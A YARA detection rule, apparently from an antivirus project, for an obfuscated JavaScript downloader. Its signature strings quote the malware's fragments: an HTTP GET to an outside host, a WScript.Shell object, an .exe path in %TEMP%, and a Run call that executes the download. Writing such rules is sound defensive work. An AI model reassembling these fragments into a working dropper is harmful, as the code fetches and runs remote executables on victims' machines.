rule sig_20160330_669a5a148d94605fc1efee9b49f62923 {
  meta:
    description = "datamaliciousorder - file 20160330_669a5a148d94605fc1efee9b49f62923.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b7cef31ecbb645b6d7e3719bd7ebe1c0d385f2cb46955b7d56f1446b24eec985"

  strings:
    $s1  = "_QY[_U](\"GET\", \"http://assura-courtage.org/j2osla\", false);" fullword ascii
    $s2  = "var _VX = function _QD() {return WScript[_X](\"WScript\"+\".Shell\");}(), _FJ = 11;" fullword ascii
    $s3  = "function _K0(_K1, _F0){_L = _L * 1; return _K1 - _F0;};" fullword ascii
    $s4  = "if (_QY[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _W(){return _M + \"\";};" fullword ascii
    $s6  = "function _MA() {return _VX[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"nLrvM6U0.ex\" + \"e\";};" fullword ascii
    $s7  = "function _T(_G){_VX[\"Run\"](_G, _L, _L);};" fullword ascii
    $s8  = "function _IC() {return ((_SW == true) && (_SW == _HT)) ? 1 : _L;};" fullword ascii
    $s9  = "function _S(){return 22;};" fullword ascii
    $s10 = "function _CZ()" fullword ascii
    $s11 = " while (_DM){" fullword ascii
    $s12 = "return _K0(_G0, _C0);" fullword ascii
    $s13 = "function _N(){return _X;};" fullword ascii
    $s14 = "function _K(_TU) {var _MB = (1, 2, 3, 4, 5, _TU); return _MB;};" fullword ascii
    $s15 = "var _C = new this[\"Date\"]();" fullword ascii
    $s16 = "var _HT = false;" fullword ascii
    $s17 = "_HT = true; " fullword ascii
    $s18 = "var _SW = false;" fullword ascii
    $s19 = "_SW = true; " fullword ascii
    $s20 = "} catch(_XI){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}